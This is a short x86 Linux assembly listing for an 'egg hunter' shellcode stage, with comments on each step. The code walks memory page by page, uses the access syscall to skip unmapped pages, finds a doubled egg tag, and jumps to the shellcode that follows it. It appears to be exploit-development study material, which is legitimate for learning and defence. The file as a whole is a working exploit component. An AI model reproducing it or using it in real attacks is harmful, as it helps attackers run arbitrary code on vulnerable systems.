global _start
 
section .text
 
_start:
    ; clear out ebx
		xor ebx,ebx 
        
        

 page_increment:
	      ; move 4096-1
        or bx, 0xfff
	

 byte_increment:
	
	      ;increment to next address
        inc ebx
        ; syscall for access(2)    
        push +0x21  
        pop eax

	      ;call interupt    
        int 0x80
 
	      ; check for EFAULT in return
        cmp al, 0xf2

	      ; if efault then move to next page
        je page_increment 

	      ; if not we move address stored in ebx to edi
	      mov edi,ebx

        ; and we move our egg tag to be checked to eax
        mov eax, 0x50905090

        ; scasd check eax==edi? if yes auto increment edi  
        scasd  

        ;if not move to next byte in same page
        jnz byte_increment

        ;check for second occurance of tag, if yes auto increment edi
        scasd 

        ; if not move to 
        jnz byte_increment

        ; finally jump to final shellcode following consecutive tags 
        jmp edi
